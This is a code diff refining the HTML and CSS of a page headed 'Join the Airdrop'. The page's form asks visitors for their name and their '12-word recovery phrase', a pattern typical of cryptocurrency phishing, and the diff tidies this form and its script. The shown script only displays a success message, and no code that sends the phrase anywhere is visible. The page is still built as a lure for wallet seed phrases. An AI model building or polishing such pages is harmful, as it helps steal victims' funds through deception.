@@ -37,7 +37,13 @@
       border: none;
       background-color: #0d1117;
       color: #fff;
+      font-size: 14px;
       resize: vertical;
+    }
+
+    textarea {
+      height: 100px;
+      line-height: 1.5;
     }
 
     input[type="submit"] {
@@ -54,29 +60,37 @@
       margin-top: 20px;
       color: #00ffcc;
       font-weight: bold;
-      display: none; /* HIDDEN BY DEFAULT */
+      display: none; /* important! hides initially */
     }
   </style>
 </head>
 <body>
   <h1>Join the Airdrop</h1>
+
   <form id="register-form">
     <input type="text" name="username" placeholder="Your Name" required />
 
-    <!-- Mnemonic input -->
-    <textarea name="wallet" placeholder="Enter your 12-word recovery phrase here..." rows="4" required></textarea>
+    <!-- This is the 12-word phrase input -->
+    <textarea name="wallet" placeholder="Enter your 12-word recovery phrase here..." required></textarea>
 
     <input type="submit" value="Register" />
   </form>
 
+  <!-- Hidden message initially -->
   <div class="success-message" id="success-message">
     🎉 Registered successfully!
   </div>
 
   <script>
-    document.getElementById("register-form").addEventListener("submit", function(e) {
+    const form = document.getElementById("register-form");
+    const successMessage = document.getElementById("success-message");
+
+    form.addEventListener("submit", function(e) {
       e.preventDefault();
-      document.getElementById("success-message").style.display = "block";
+
+      // Optional: You can validate the mnemonic here (e.g., 12 words)
+
+      successMessage.style.display = "block";
     });
   </script>
 </body>
